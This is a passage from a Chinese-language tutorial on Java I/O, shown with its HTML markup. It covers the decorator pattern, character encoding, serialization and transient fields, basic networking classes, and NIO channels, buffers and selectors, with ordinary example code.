operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h2><p>Java I/O 使用了装饰者模式来实现。以 InputStream 为例，</p><ul><li>InputStream 是抽象组件；</li><li>FileInputStream 是 InputStream 的子类，属于具体组件，提供了字节流的输入操作；</li><li>FilterInputStream 属于抽象装饰者，装饰者用于装饰组件，为组件提供额外的功能。例如 BufferedInputStream 为 FileInputStream 提供缓存的功能。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/DP-Decorator-java.io.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/DP-Decorator-java.io.png" alt="img"></a></p><p>实例化一个具有缓存功能的字节流对象时，只需要在 FileInputStream 对象上再套一层 BufferedInputStream 对象即可。</p><pre class=" language-java"><code class="language-java">FileInputStream fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>BufferedInputStream bufferedInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>DataInputStream 装饰者提供了对更多数据类型进行输入的操作，比如 int、double 等基本类型。</p><h1 id="四、字符操作"><a href="#四、字符操作" class="headerlink" title="四、字符操作"></a>四、字符操作</h1><h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><p>编码就是把字符转换为字节，而解码是把字节重新组合成字符。</p><p>如果编码和解码过程使用不同的编码方式那么就出现了乱码。</p><ul><li>GBK 编码中，中文字符占 2 个字节，英文字符占 1 个字节；</li><li>UTF-8 编码中，中文字符占 3 个字节，英文字符占 1 个字节；</li><li>UTF-16be 编码中，中文字符和英文字符都占 2 个字节。</li></ul><p>UTF-16be 中的 be 指的是 Big Endian，也就是大端。相应地也有 UTF-16le，le 指的是 Little Endian，也就是小端。</p><p>Java 的内存编码使用双字节编码 UTF-16be，这不是指 Java 只支持这一种编码方式，而是说 char 这种类型使用 UTF-16be 进行编码。char 类型占 16 位，也就是两个字节，Java 使用这种双字节编码是为了让一个中文或者一个英文都能使用一个 char 来存储。</p><h2 id="String-的编码方式"><a href="#String-的编码方式" class="headerlink" title="String 的编码方式"></a>String 的编码方式</h2><p>String 可以看成一个字符序列，可以指定一个编码方式将它编码为字节序列，也可以指定一个编码方式将一个字节序列解码为 String。</p><pre class=" language-java"><code class="language-java">String str1 <span class="token operator">=</span> <span class="token string">"中文"</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> str1<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>String str2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在调用无参数 getBytes() 方法时，默认的编码方式不是 UTF-16be。双字节编码的好处是可以使用一个 char 存储中文和英文，而将 String 转为 bytes[] 字节数组就不再需要这个好处，因此也就不再需要双字节编码。getBytes() 的默认编码方式与平台有关，一般为 UTF-8。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> str1<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Reader-与-Writer"><a href="#Reader-与-Writer" class="headerlink" title="Reader 与 Writer"></a>Reader 与 Writer</h2><p>不管是磁盘还是网络传输，最小的存储单元都是字节，而不是字符。但是在程序中操作的通常是字符形式的数据，因此需要提供对字符进行操作的方法。</p><ul><li>InputStreamReader 实现从字节流解码成字符流；</li><li>OutputStreamWriter 实现字符流编码成为字节流。</li></ul><h2 id="实现逐行输出文本文件的内容"><a href="#实现逐行输出文本文件的内容" class="headerlink" title="实现逐行输出文本文件的内容"></a>实现逐行输出文本文件的内容</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">readFileContent</span><span class="token punctuation">(</span>String filePath<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    FileReader fileReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>    BufferedReader bufferedReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>fileReader<span class="token punctuation">)</span><span class="token punctuation">;</span>    String line<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> bufferedReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 装饰者模式使得 BufferedReader 组合了一个 Reader 对象</span>    <span class="token comment" spellcheck="true">// 在调用 BufferedReader 的 close() 方法时会去调用 Reader 的 close() 方法</span>    <span class="token comment" spellcheck="true">// 因此只要一个 close() 调用即可</span>    bufferedReader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="五、对象操作"><a href="#五、对象操作" class="headerlink" title="五、对象操作"></a>五、对象操作</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化就是将一个对象转换成字节序列，方便存储和传输。</p><ul><li>序列化：ObjectOutputStream.writeObject()</li><li>反序列化：ObjectInputStream.readObject()</li></ul><p>不会对静态变量进行序列化，因为序列化只是保存对象的状态，静态变量属于类的状态。</p><h2 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h2><p>序列化的类需要实现 Serializable 接口，它只是一个标准，没有任何方法需要实现，但是如果不去实现它的话而进行序列化，会抛出异常。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    A a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String objectFile <span class="token operator">=</span> <span class="token string">"file/a1"</span><span class="token punctuation">;</span>    ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>objectFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>objectFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    A a2 <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">private</span> String y<span class="token punctuation">;</span>    <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> String y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"x = "</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">"  "</span> <span class="token operator">+</span> <span class="token string">"y = "</span> <span class="token operator">+</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="transient"><a href="#transient" class="headerlink" title="transient"></a>transient</h2><p>transient 关键字可以使一些属性不会被序列化。</p><p>ArrayList 中存储数据的数组 elementData 是用 transient 修饰的，因为这个数组是动态扩展的，并不是所有的空间都被使用，因此就不需要所有的内容都被序列化。通过重写序列化和反序列化方法，使得可以只序列化数组中有内容的那部分数据。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">transient</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> elementData<span class="token punctuation">;</span></code></pre><h1 id="六、网络操作"><a href="#六、网络操作" class="headerlink" title="六、网络操作"></a>六、网络操作</h1><p>Java 中的网络支持：</p><ul><li>InetAddress：用于表示网络上的硬件资源，即 IP 地址；</li><li>URL：统一资源定位符；</li><li>Sockets：使用 TCP 协议实现网络通信；</li><li>Datagram：使用 UDP 协议实现网络通信。</li></ul><h2 id="InetAddress"><a href="#InetAddress" class="headerlink" title="InetAddress"></a>InetAddress</h2><p>没有公有的构造函数，只能通过静态方法来创建实例。</p><pre class=" language-java"><code class="language-java">InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>String host<span class="token punctuation">)</span><span class="token punctuation">;</span>InetAddress<span class="token punctuation">.</span><span class="token function">getByAddress</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>可以直接从 URL 中读取字节流数据。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 字节流 */</span>    InputStream is <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 字符流 */</span>    InputStreamReader isr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 提供缓存功能 */</span>    BufferedReader br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>isr<span class="token punctuation">)</span><span class="token punctuation">;</span>    String line<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    br<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Sockets"><a href="#Sockets" class="headerlink" title="Sockets"></a>Sockets</h2><ul><li>ServerSocket：服务器端类</li><li>Socket：客户端类</li><li>服务器和客户端通过 InputStream 和 OutputStream 进行输入输出。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ClienteServidorSockets1521731145260.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ClienteServidorSockets1521731145260.jpg" alt="img"></a></p><h2 id="Datagram"><a href="#Datagram" class="headerlink" title="Datagram"></a>Datagram</h2><ul><li>DatagramSocket：通信类</li><li>DatagramPacket：数据包类</li></ul><h1 id="七、NIO"><a href="#七、NIO" class="headerlink" title="七、NIO"></a>七、NIO</h1><p>新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的，弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。</p><h2 id="流与块"><a href="#流与块" class="headerlink" title="流与块"></a>流与块</h2><p>I/O 与 NIO 最重要的区别是数据打包和传输的方式，I/O 以流的方式处理数据，而 NIO 以块的方式处理数据。</p><p>面向流的 I/O 一次处理一个字节数据：一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，面向流的 I/O 通常相当慢。</p><p>面向块的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。</p><p>I/O 包和 NIO 已经很好地集成了，java.io.<em> 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.</em> 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。</p><h2 id="通道与缓冲区"><a href="#通道与缓冲区" class="headerlink" title="通道与缓冲区"></a>通道与缓冲区</h2><h3 id="1-通道"><a href="#1-通道" class="headerlink" title="1. 通道"></a>1. 通道</h3><p>通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。</p><p>通道与流的不同之处在于，流只能在一个方向上移动(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。</p><p>通道包括以下类型：</p><ul><li>FileChannel：从文件中读写数据；</li><li>DatagramChannel：通过 UDP 读写网络中数据；</li><li>SocketChannel：通过 TCP 读写网络中数据；</li><li>ServerSocketChannel：可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。</li></ul><h3 id="2-缓冲区"><a href="#2-缓冲区" class="headerlink" title="2. 缓冲区"></a>2. 缓冲区</h3><p>发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。</p><p>缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。</p><p>缓冲区包括以下类型：</p><ul><li>ByteBuffer</li><li>CharBuffer</li><li>ShortBuffer</li><li>IntBuffer</li><li>LongBuffer</li><li>FloatBuffer</li><li>DoubleBuffer</li></ul><h2 id="缓冲区状态变量"><a href="#缓冲区状态变量" class="headerlink" title="缓冲区状态变量"></a>缓冲区状态变量</h2><ul><li>capacity：最大容量；</li><li>position：当前已经读写的字节数；</li><li>limit：还可以读写的字节数。</li></ul><p>状态变量的改变过程举例：</p><p>① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1bea398f-17a7-4f67-a90b-9e2d243eaa9a.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1bea398f-17a7-4f67-a90b-9e2d243eaa9a.png" alt="img"></a></p><p>② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 为 5，limit 保持不变。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/80804f52-8815-4096-b506-48eef3eed5c6.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/80804f52-8815-4096-b506-48eef3eed5c6.png" alt="img"></a></p><p>③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/952e06bd-5a65-4cab-82e4-dd1536462f38.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/952e06bd-5a65-4cab-82e4-dd1536462f38.png" alt="img"></a></p><p>④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/b5bdcbe2-b958-4aef-9151-6ad963cb28b4.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/b5bdcbe2-b958-4aef-9151-6ad963cb28b4.png" alt="img"></a></p><p>⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/67bf5487-c45d-49b6-b9c0-a058d8c68902.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/67bf5487-c45d-49b6-b9c0-a058d8c68902.png" alt="img"></a></p><h2 id="文件-NIO-实例"><a href="#文件-NIO-实例" class="headerlink" title="文件 NIO 实例"></a>文件 NIO 实例</h2><p>以下展示了使用 NIO 快速复制文件的实例：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">fastCopy</span><span class="token punctuation">(</span>String src<span class="token punctuation">,</span> String dist<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 获得源文件的输入字节流 */</span>    FileInputStream fin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 获取输入字节流的文件通道 */</span>    FileChannel fcin <span class="token operator">=</span> fin<span class="token punctuation">.</span><span class="token function">getChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 获取目标文件的输出字节流 */</span>    FileOutputStream fout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dist<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 获取输出字节流的文件通道 */</span>    FileChannel fcout <span class="token operator">=</span> fout<span class="token punctuation">.</span><span class="token function">getChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 为缓冲区分配 1024 个字节 */</span>    ByteBuffer buffer <span class="token operator">=</span> ByteBuffer<span class="token punctuation">.</span><span class="token function">allocateDirect</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/* 从输入通道中读取数据到缓冲区中 */</span>        <span class="token keyword">int</span> r <span class="token operator">=</span> fcin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* read() 返回 -1 表示 EOF */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/* 切换读写 */</span>        buffer<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* 把缓冲区的内容写入输出文件中 */</span>        fcout<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* 清空缓冲区 */</span>        buffer<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>NIO 常常被叫做非阻塞 IO，主要是因为 NIO 在网络通信中的非阻塞特性被广泛使用。</p><p>NIO 实现了 IO 多路复用中的 Reactor 模型，一个线程 Thread 使用一个选择器 Selector 通过轮询的方式去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。</p><p>通过配置监听的通道 Channel 为非阻塞，那么当 Channel 上的 IO 事件还未到达时，就不会进入阻塞状态一直等待，而是继续轮询其它 Channel，找到 IO 事件已经到达的 Channel 执行。</p><p>因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件，对于 IO 密集型的应用具有很好地性能。</p><p>应该注意的是，只有套接字 Channel 才能配置为非阻塞，而 FileChannel 不能，为 FileChannel 配置非阻塞也没有意义。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/4d930e22-f493-49ae-8dff-ea21cd6895dc.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/4d930e22-f493-49ae-8dff-ea21cd6895dc.png" alt="img"></a></p><h3 id="1-创建选择器"><a href="#1-创建选择器" class="headerlink" title="1. 创建选择器"></a>1. 创建选择器</h3><pre class=" language-java"><code class="language-java">Selector selector <span class="token operator">=</span> Selector<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-将通道注册到选择器上"><a href="#2-将通道注册到选择器上" class="headerlink" title="2. 将通道注册到选择器上"></a>2. 将通道注册到选择器上</h3><pre class=" language-java"><code class="language-java">ServerSocketChannel ssChannel <span class="token operator">=</span> ServerSocketChannel<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ssChannel<span class="token punctuation">.</span><span class="token function">configureBlocking</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ssChannel<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>selector<span class="token punctuation">,</span> SelectionKey<span class="token punctuation">.</span>OP_ACCEPT<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通道必须配置为非阻塞模式，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。</p><p>在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类：</p><ul><li>SelectionKey.OP_CONNECT</li><li>SelectionKey.OP_ACCEPT</li><li>SelectionKey.OP_READ</li><li>SelectionKey.OP_WRITE</li></ul><p>它们在 SelectionKey 的定义如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> OP_READ <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> OP_WRITE <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> OP_CONNECT <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> OP_ACCEPT <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span></code></pre><p>可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> interestSet <span class="token operator">=</span> SelectionKey<span class="token punctuation">.</span>OP_READ <span class="token operator">|</span> SelectionKey<span class="token punctuation">.</span>OP_WRITE<span class="token punctuation">;</span></code></pre><h3 id="3-监听事件"><a href="#3-监听事件" class="headerlink" title="3. 监听事件"></a>3. 监听事件</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> num <span class="token operator">=</span> selector<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用 select() 来监听到达的事件，它会一直阻塞直到有至少一个事件到达。</p><h3 id="4-获取到达的事件"><a href="#4-获取到达的事件" class="headerlink" title="4. 获取到达的事件"></a>4. 获取到达的事件</h3><pre class=" language-java"><code class="language-java">Set<span class="token operator">&lt;</span>SelectionKey<span class="token operator">></span> keys <span class="token operator">=</span> selector<span class="token punctuation">.</span><span class="token function">selectedKeys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Iterator<span class="token operator">&lt;</span>SelectionKey<span class="token operator">></span> keyIterator <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>keyIterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    SelectionKey key <span class="token operator">=</span> keyIterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">isAcceptable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">isReadable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span>    keyIterator<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="5-事件循环"><a href="#5-事件循环" class="headerlink" title="5. 事件循环"></a>5. 事件循环</h3><p>因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> num <span class="token 